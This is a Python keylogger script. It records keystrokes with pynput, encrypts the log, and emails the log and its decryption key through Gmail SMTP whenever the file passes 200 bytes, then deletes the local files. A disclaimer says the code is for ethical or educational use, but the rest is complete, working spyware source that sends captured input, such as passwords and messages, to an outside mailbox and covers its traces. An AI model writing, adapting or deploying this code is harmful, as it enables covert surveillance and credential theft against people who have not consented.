# Install required libraries:
# pip install pynput cryptography python-dotenv

'''❌ Warning: Keylogging without consent is illegal! and can lead to serious consequences.(fines, imprisonment, etc.)
You should never use this code to log someone's keystrokes without their permission.
Use it only for ethical hacking, forensics, or educational purposes.'''

# Newfeature: Encrypting the keylog file before sending it via email.
# Decryption key will be sent in the email body.

# import the necessary libraries
from pynput import keyboard
import smtplib
import ssl
import os
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from dotenv import load_dotenv
from cryptography.fernet import Fernet

# Load environment variables
load_dotenv()

# Email configuration
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587
EMAIL_ADDRESS = os.getenv("EMAIL_ADDRESS")
EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD")

# File and size configuration
directory_path = os.path.abspath("./temp_files")
os.makedirs(directory_path, exist_ok=True)
file_path = os.path.join(directory_path, "keylog.txt")
encrypted_file = os.path.join(directory_path, "keylog_encrypted.txt")

FILE_SIZE_THRESHOLD = 200  # 200 bytes (Adjust as needed)

# Special keys mapping
IGNORED_KEYS = {
    keyboard.Key.shift, keyboard.Key.shift_r, keyboard.Key.ctrl, keyboard.Key.ctrl_r, keyboard.Key.alt,
    keyboard.Key.alt_r, keyboard.Key.caps_lock, keyboard.Key.num_lock, keyboard.Key.scroll_lock,
    keyboard.Key.cmd, keyboard.Key.cmd_r, keyboard.Key.insert
}

SPECIAL_KEYS = {
    keyboard.Key.space: " ",
    keyboard.Key.enter: "\n",
    keyboard.Key.tab: "\t"
}

typed_text = ""

# Function to encrypt the file and return the encryption key
def encrypt_file(input_file, output_file):
    print("[*] Encrypting file...")
    key = Fernet.generate_key()
    fernet = Fernet(key)

    with open(input_file, 'rb') as f:
        original_data = f.read()

    encrypted_data = fernet.encrypt(original_data)

    with open(output_file, 'wb') as f:
        f.write(encrypted_data)

    print("[*] File encrypted successfully.")
    return key.decode()  # Return the key as string

# Function to send email with attachment and encryption key
def send_email(encryption_key):
    try:
        print("[*] Preparing to send email...")
        msg = MIMEMultipart()
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = EMAIL_ADDRESS
        msg['Subject'] = "Encrypted Keylogger File"

        body = f"Attached is the encrypted keylog file.\n\nDecryption Key:\n{encryption_key}"
        msg.attach(MIMEText(body, 'plain'))

        if os.path.exists(encrypted_file):
            with open(encrypted_file, 'rb') as attachment:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(attachment.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f'attachment; filename= {os.path.basename(encrypted_file)}')
            msg.attach(part)
            print("[*] Attachment added to email.")
        else:
            print("[!] Encrypted file not found, cannot attach.")
            return

        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls(context=ssl.create_default_context())
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        server.send_message(msg)
        server.quit()

        print("[+] Email sent successfully!")

        # Clean up files after sending
        os.remove(file_path) # Remove the original keylog file
        os.remove(encrypted_file) # Remove the encrypted file
        #os.rmdir(directory_path)  # Remove the directory if empty
        print("[*] Temporary files cleaned up.")

    except Exception as e:
        print(f"[!] Failed to send email: {e}")

# Key press event handler
def keyPressed(key):
    global typed_text

    try:
        if key in IGNORED_KEYS:
            return

        if key in SPECIAL_KEYS:
            key_str = SPECIAL_KEYS[key]
        elif key == keyboard.Key.backspace:
            typed_text = typed_text[:-1]
            return
        else:
            key_str = key.char if hasattr(key, 'char') and key.char is not None else ''

        typed_text += key_str

        # Append to file
        with open(file_path, "a", encoding="utf-8") as f:
            f.write(key_str)

        # Stop logging when ESC is pressed
        if key == keyboard.Key.esc:
            with open(file_path, "a", encoding="utf-8") as file:
                file.write(typed_text)  # Save remaining typed text
            print("\nESC key detected. Stopping keylogger...")
            return False  # Stop the listener
        
        # Check file size
        if os.path.exists(file_path):
            current_size = os.path.getsize(file_path)
            print(f"[*] Current file size: {current_size} bytes")

            if current_size >= FILE_SIZE_THRESHOLD:
                print("[*] File size threshold reached.")
                encryption_key = encrypt_file(file_path, encrypted_file)
                send_email(encryption_key)

    except Exception as e:
        print(f"[!] Error processing key press: {e}")

if __name__ == "__main__":
    print("[*] Keylogger is running...")
    with keyboard.Listener(on_press=keyPressed) as listener:
        listener.join()
